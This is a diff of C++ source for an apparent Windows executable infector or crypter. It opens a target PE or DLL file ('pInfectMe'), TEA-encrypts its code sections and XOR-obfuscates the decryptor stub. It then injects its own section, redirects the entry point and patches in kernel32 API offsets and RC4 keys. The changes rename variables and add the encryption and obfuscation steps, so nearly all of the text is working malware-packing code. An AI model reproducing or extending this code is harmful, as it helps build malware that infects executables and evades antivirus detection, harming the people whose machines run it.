@@ -12,7 +12,7 @@
 #ifdef _BUILD32
 
 extern BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
-extern VOID WINAPI __crt0Startup();
+extern "C" VOID WINAPI __crt0Startup(DWORD);
 extern "C" VOID WINAPI DELAYDECRYPT();
 
 
@@ -184,7 +184,7 @@ int main32(int argc, char *argv[])
 	PIMAGE_DOS_HEADER pInfectMe = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], 0);
 	PIMAGE_NT_HEADERS pInfectMeNtHeader = CALC_OFFSET(PIMAGE_NT_HEADERS, pInfectMe, pInfectMe->e_lfanew);
 	
-	PIMAGE_SECTION_HEADER pSectionHermit64 = NULL;
+	PIMAGE_SECTION_HEADER pSectionInput = NULL;
 
 	BOOL isDLL = TRUE;
 
@@ -192,12 +192,12 @@ int main32(int argc, char *argv[])
 	{	// it's a DLL?!?!?
 		std::cout << "Input file is DLL!" << std::endl;
 
-		pSectionHermit64 = lookup_core_section(pImageDosHeader, pImageNtHeaders32, TRUE);
+		pSectionInput = lookup_core_section(pImageDosHeader, pImageNtHeaders32, TRUE);
 	}
 	else if ((pInfectMeNtHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == IMAGE_FILE_EXECUTABLE_IMAGE)
 	{
 		std::cout << "Input file is EXECUTABLE!" << std::endl;
-		pSectionHermit64 = lookup_core_section(pImageDosHeader, pImageNtHeaders32, FALSE);
+		pSectionInput = lookup_core_section(pImageDosHeader, pImageNtHeaders32, FALSE);
 		isDLL = FALSE;
 	}
 	else
@@ -208,10 +208,10 @@ int main32(int argc, char *argv[])
 
 	VirtualFree(pInfectMe, 0, MEM_RELEASE);
 
-	pInfectMe = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], RoundUp(pSectionHermit64->Misc.VirtualSize, 16384) / 4096);
+	pInfectMe = (PIMAGE_DOS_HEADER) InternalLoadLibrary(argv[1], RoundUp(pSectionInput->Misc.VirtualSize, 16384) / 4096);
 	pInfectMeNtHeader = CALC_OFFSET(PIMAGE_NT_HEADERS, pInfectMe, pInfectMe->e_lfanew);
 
-	if (pSectionHermit64 == NULL)
+	if (pSectionInput == NULL)
 	{	//  break!
 		std::cout << "Cannot find <PACKER> in sections" << std::endl;
 		return 0;
@@ -225,21 +225,21 @@ int main32(int argc, char *argv[])
 	//for(PIMAGE_SECTION_HEADER pProcessSection = pLastSection; pProcessSection >= IMAGE_FIRST_SECTION( pInfectMeNtHeader); pProcessSection--)
 	//{
 	//	DWORD oldVirtualAddress = pProcessSection->VirtualAddress;
-	//	pProcessSection->VirtualAddress += 0x2000;
+	//	pProcessSection->VirtualAddress += 0x4000;
 
 	//	memmove(rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) pProcessSection->VirtualAddress), rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) oldVirtualAddress), pProcessSection->SizeOfRawData);
 
-	//	pProcessSection->VirtualAddress += 0x2000;
-	//	pProcessSection->PointerToRawData += 0x2000;
+	//	pProcessSection->VirtualAddress += 0x4000;
+	//	pProcessSection->PointerToRawData += 0x4000;
 
 	//	memcpy(pProcessSection + 1, pProcessSection, sizeof(IMAGE_SECTION_HEADER));
 	//}
 
 
 	//pInfectMeNtHeader->FileHeader.NumberOfSections ++;
-	//pFirstSection->Misc.VirtualSize = 0x2000;
+	//pFirstSection->Misc.VirtualSize = 0x4000;
 	//pFirstSection->VirtualAddress = 0x1000;
-	//pFirstSection->SizeOfRawData = 0x2000;
+	//pFirstSection->SizeOfRawData = 0x4000;
 	//pFirstSection->Name[0] = '!';
 	//pFirstSection->PointerToRawData = 0x400;
 
@@ -357,7 +357,7 @@ int main32(int argc, char *argv[])
 		else if ((pProcessSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE)
 		{
 			if (
-				(RoundUp(pProcessSection->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.SectionAlignment) - pProcessSection->Misc.VirtualSize) >= pSectionHermit64->Misc.VirtualSize)
+				(RoundUp(pProcessSection->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.SectionAlignment) - pProcessSection->Misc.VirtualSize) >= pSectionInput->Misc.VirtualSize)
 			{
 				std::cout << "TEXT section of process can contain ourself!!!" << std::endl;
 				//pDestSection = pProcessSection;
@@ -374,7 +374,7 @@ int main32(int argc, char *argv[])
 				LPDWORD encptr = (LPDWORD) rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) pProcessSection->VirtualAddress);
 
 				for(DWORD dwPtr = 0; dwPtr < pProcessSection->SizeOfRawData; dwPtr += 8, encptr += 2)
-					encrypt((uint32_t *) encptr, key);
+					tea_encrypt((uint32_t *) encptr, key);
 			}
 
 			if (strcmp((char *) pProcessSection->Name, ".text") == 0)
@@ -398,7 +398,7 @@ int main32(int argc, char *argv[])
 				LPDWORD encptr = (LPDWORD) rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) pProcessSection->VirtualAddress);
 
 				for(DWORD dwPtr = 0; dwPtr < pProcessSection->SizeOfRawData; dwPtr += 8, encptr += 2)
-					encrypt((uint32_t *) encptr, key);
+					tea_encrypt((uint32_t *) encptr, key);
 			}
 
 		}
@@ -421,12 +421,12 @@ int main32(int argc, char *argv[])
 				LPDWORD encptr = (LPDWORD) sectionAddress;
 
 				for(DWORD dwPtr = 0; dwPtr < sizeOfSection; dwPtr += 8, encptr += 2)
-					encrypt((uint32_t *) encptr, key);
+					tea_encrypt((uint32_t *) encptr, key);
 			}
 		}
 
 	}
-		
+	
 	//memcpy(pInfectSection->Name, szHermitName, 8);
 
 	char *szSectionName = ".textbss";
@@ -436,12 +436,12 @@ int main32(int argc, char *argv[])
 	if (pDestSection == NULL)
 	{	// text section cannot contain ourself! increase counter and add on tail new section!
 		pInfectSection = CALC_OFFSET(PIMAGE_SECTION_HEADER, pInfectSection, sizeof(IMAGE_SECTION_HEADER) * pInfectMeNtHeader->FileHeader.NumberOfSections);
-		memcpy(pInfectSection, pSectionHermit64, sizeof(IMAGE_SECTION_HEADER));
+		memcpy(pInfectSection, pSectionInput, sizeof(IMAGE_SECTION_HEADER));
 		memcpy(pInfectSection->Name, szSectionName, 8);
-		//pInfectSection->Misc.VirtualSize = pSectionHermit64->Misc.VirtualSize;
+		//pInfectSection->Misc.VirtualSize = pSectionInput->Misc.VirtualSize;
 		pInfectSection->VirtualAddress = NextVirtualAddress(pInfectMeNtHeader);
 		pInfectSection->PointerToRawData = NextPointerToRawData(pInfectMeNtHeader);
-		pInfectSection->SizeOfRawData = RoundUp(pSectionHermit64->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.FileAlignment);
+		pInfectSection->SizeOfRawData = RoundUp(pSectionInput->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.FileAlignment);
 		pInfectSection->Characteristics = 0xE0000020;
 
 		pInfectMeNtHeader->FileHeader.NumberOfSections++;	// increment counter after!!!
@@ -451,7 +451,7 @@ int main32(int argc, char *argv[])
 		pInfectSection = (PIMAGE_SECTION_HEADER) malloc(sizeof(IMAGE_SECTION_HEADER));
 		memcpy(pInfectSection, pDestSection, sizeof(IMAGE_SECTION_HEADER));
 		pInfectSection->VirtualAddress = pDestSection->VirtualAddress + pDestSection->Misc.VirtualSize;
-		pDestSection->Misc.VirtualSize += pSectionHermit64->Misc.VirtualSize;
+		pDestSection->Misc.VirtualSize += pSectionInput->Misc.VirtualSize;
 		DWORD dwAddSizeOfRawData = RoundUp(pDestSection->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.FileAlignment) - pDestSection->SizeOfRawData;
 		pDestSection->SizeOfRawData = RoundUp(pDestSection->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.FileAlignment);
 
@@ -483,28 +483,56 @@ int main32(int argc, char *argv[])
 	else
 		table = exe32_FakeExport;
 
-	LPVOID lpRawSource = rva2addr(pImageDosHeader, pImageNtHeaders32, CALC_OFFSET(LPVOID, pImageDosHeader, pSectionHermit64->VirtualAddress));
+	LPVOID lpRawSource = rva2addr(pImageDosHeader, pImageNtHeaders32, CALC_OFFSET(LPVOID, pImageDosHeader, pSectionInput->VirtualAddress));
 	LPVOID lpRawDestin = rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) pInfectSection->VirtualAddress);
-		
+
+
+	/*******************************************************************************************
+	 * WARNING!!!
+	 *	The next memcpy transfer section from our binary into target!
+	 *	All patch/modification must be done after next line!
+	 ******************************************************************************************/
+	memcpy(lpRawDestin, lpRawSource, pSectionInput->SizeOfRawData);
+
+	/**
+	 *	Decryption routine
+	 **/
+	if (isDLL)
+	{	// process code for encryption of "RC4"
 	
-	//pSectionHermit64->SizeOfRawData = RoundUp(pSectionHermit64->SizeOfRawData, pInfectMeNtHeader->OptionalHeader.SectionAlignment);
+	}
+	else
+	{	// process code for encryption of TEA
+		void *start = static_cast<void *>(&tea_decrypt);
+		void *end = static_cast<void *>(&tea_decrypt_end_marker);
+		int size = static_cast<int>((int) end - (int) start);
 
-	memcpy(lpRawDestin, lpRawSource, pSectionHermit64->SizeOfRawData);
+		char *encrypt = (char *) FindBlockMem((LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, start, size);
 
+		while(size-- > 0) 
+		{
+			*encrypt++ ^= 0x66;
+		}
+
+	}
+
+	/**
+	 *	EXPORT SYMBOLS
+	 **/
 	if (isDLL)
 	{	// DLL - Patch 
 		for(int i=0; i < ExportDirectory->NumberOfFunctions; i++)
 		{
 			ULONG exportRVA = table[i];
 
-			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionHermit64->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
+			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionInput->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
 			exportSymbolEntryPoint = pInfectSection->VirtualAddress + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
 		
 			DWORD dwOldValue = AddressOfFunctions[i];
 			AddressOfFunctions[i] = exportSymbolEntryPoint;
 		
-			Patch_EXPORT_SYMBOL(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, (LPVOID) table[i], exportSymbolEntryPoint, dwOldValue - 0x1000);
+			Patch_EXPORT_SYMBOL(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, (LPVOID) table[i], exportSymbolEntryPoint, dwOldValue - 0x1000);
 		}
 	}
 	else
@@ -514,7 +542,7 @@ int main32(int argc, char *argv[])
 		for(int i = 0; i < (sizeof(table) / sizeof(ULONG)); i++)
 		{	//
 			ULONG exportRVA = table[i];
-			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionHermit64->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
+			ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionInput->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
 			exportSymbolEntryPoint = pInfectSection->VirtualAddress + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
 
@@ -525,18 +553,18 @@ int main32(int argc, char *argv[])
 		}
 	}
 
-	DWORD dwOffset = RoundUp(pSectionHermit64->SizeOfRawData, 16);
+	DWORD dwOffset = RoundUp(pSectionInput->SizeOfRawData, 16);
 
 	ULONG offsetEntryPoint = (ULONG) (DllEntryPoint);
 
-	ULONG rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pSectionHermit64->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
+	ULONG rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pSectionInput->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 	
 	DWORD AddressOfEntryPoint = pInfectMeNtHeader->OptionalHeader.AddressOfEntryPoint;
 	
 	if (isDLL == FALSE)
 	{	// it's a dll!!
 		offsetEntryPoint = (ULONG) (__crt0Startup);
-		rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pSectionHermit64->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
+		rvaEntryPoint = offsetEntryPoint - ((ULONG) pImageDosHeader) - pSectionInput->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 	}
 	
 	pInfectMeNtHeader->OptionalHeader.AddressOfEntryPoint = pInfectSection->VirtualAddress + rvaEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
@@ -547,7 +575,7 @@ int main32(int argc, char *argv[])
 
 	// Patch Entry point
 	
-	//Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
+	//Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
 
 
 	if (kernel32GetProcAddress_Offset == 0 || kernel32LoadLibraryA_Offset == 0)
@@ -558,22 +586,25 @@ int main32(int argc, char *argv[])
 
 	ULONG64 *passKeyPtr = (ULONG64*) &passKey;
 
-	//Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
+	//Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_EntryPoint, 9, AddressOfEntryPoint);
 
+	/**
+	 *	patch code
+	 **/
 	if (isDLL)
 	{	// DLL ! FIX entry point
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_EntryPoint, 0x10, AddressOfEntryPoint-0x1000);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_LoadLibraryA, 0x12, kernel32LoadLibraryA_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_GetProcAddress, 0x12, kernel32GetProcAddress_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_GetModuleFileNameA, 0x12, kernel32GetModuleFileNameA_Offset);
+		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_EntryPoint, 0x10, AddressOfEntryPoint-0x1000);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_LoadLibraryA, 0x12, kernel32LoadLibraryA_Offset);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_GetProcAddress, 0x12, kernel32GetProcAddress_Offset);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_GetModuleFileNameA, 0x12, kernel32GetModuleFileNameA_Offset);
 	}
 	else
 	{	// EXE ! FIX entry point
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_CrtStartup, 0x0A, AddressOfEntryPoint-0x1000, 0x0a);
-		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_GETBASE, 0x0a, pInfectSection->VirtualAddress, 0x01);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_exe_LoadLibraryA, 0x12, kernel32LoadLibraryA_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_exe_GetProcAddress, 0x12, kernel32GetProcAddress_Offset);
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_exe_GetModuleFileNameA, 0x12, kernel32GetModuleFileNameA_Offset);
+		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_CrtStartup, 0x0A, AddressOfEntryPoint-0x1000, 0x0a);
+		Patch_Entry(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_GETBASE, 0x0a, pInfectSection->VirtualAddress, 0x01);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_exe_LoadLibraryA, 0x12, kernel32LoadLibraryA_Offset);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_exe_GetProcAddress, 0x12, kernel32GetProcAddress_Offset);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_exe_GetModuleFileNameA, 0x12, kernel32GetModuleFileNameA_Offset);
 	}
 
 	
@@ -581,7 +612,7 @@ int main32(int argc, char *argv[])
 	{
 		ULONG exportRVA = (isDLL) ? (ULONG) _CreateFileA : (ULONG) _exe_CreateFileA;
 
-		ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionHermit64->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
+		ULONG exportSymbolEntryPoint = exportRVA - ((ULONG) pImageDosHeader) - pSectionInput->VirtualAddress; // - pImageNtHeaders64->OptionalHeader.SectionAlignment); // 
 		
 		exportSymbolEntryPoint = pInfectSection->VirtualAddress + exportSymbolEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
 		LPBYTE lp = (LPBYTE) FindBlockMem((LPBYTE)lpRawDestin, pInfectSection->SizeOfRawData, (isDLL) ? (LPVOID) _CreateFileA : (LPVOID) _exe_CreateFileA, 0x12);
@@ -593,27 +624,27 @@ int main32(int argc, char *argv[])
 	}
 	else
 	{	// applying patch!!!
-		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, (isDLL) ? &_CreateFileA : &_exe_CreateFileA, 0x12, kernel32CreateFileA_Offset);
+		Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, (isDLL) ? &_CreateFileA : &_exe_CreateFileA, 0x12, kernel32CreateFileA_Offset);
 	}
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, (isDLL) ? &_SetFilePointer : &_exe_SetFilePointer, 0x12, kernel32SetFilePointer_Offset);
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, (isDLL) ? &_ReadFile : &_exe_ReadFile, 0x12, kernel32ReadFile_Offset);
-	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, (isDLL) ? &_CloseHandle : &_exe_CloseHandle, 0x12, kernel32CloseHandle_Offset);
+	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, (isDLL) ? &_SetFilePointer : &_exe_SetFilePointer, 0x12, kernel32SetFilePointer_Offset);
+	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, (isDLL) ? &_ReadFile : &_exe_ReadFile, 0x12, kernel32ReadFile_Offset);
+	Patch_MARKER(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, (isDLL) ? &_CloseHandle : &_exe_CloseHandle, 0x12, kernel32CloseHandle_Offset);
 
-	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_rc4key0, passKeyPtr[0]);
-	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_rc4key1, passKeyPtr[1]);
-	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &dwRelocSize, pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
-	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &lpRelocAddress, pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_rc4key0, passKeyPtr[0]);
+	Patch_MARKER_QWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_rc4key1, passKeyPtr[1]);
+	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &dwRelocSize, pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
+	Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &lpRelocAddress, pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 	
 	if (isDLL)
 	{	// nothing!!!
 	}
 	else
 	{	// save preferred image base
-		Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionHermit64->SizeOfRawData, &_baseAddress, pInfectMeNtHeader->OptionalHeader.ImageBase);
+		Patch_MARKER_DWORD(pInfectMe, (LPBYTE) lpRawDestin, pSectionInput->SizeOfRawData, &_baseAddress, pInfectMeNtHeader->OptionalHeader.ImageBase);
 	}
 
 
-	DWORD dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pSectionHermit64, CALC_OFFSET(LPVOID, lpRawDestin, dwOffset), pInfectSection->VirtualAddress, pInfectMe, pInfectMeNtHeader);
+	DWORD dwNewRelocSize = Transfer_Reloc_Table(pImageDosHeader, pImageNtHeaders32, pSectionInput, CALC_OFFSET(LPVOID, lpRawDestin, dwOffset), pInfectSection->VirtualAddress, pInfectMe, pInfectMeNtHeader);
 	DWORD dwNewRelocOffset = pInfectSection->VirtualAddress + dwOffset;
 	pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = dwNewRelocSize;
 	pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = dwNewRelocOffset;
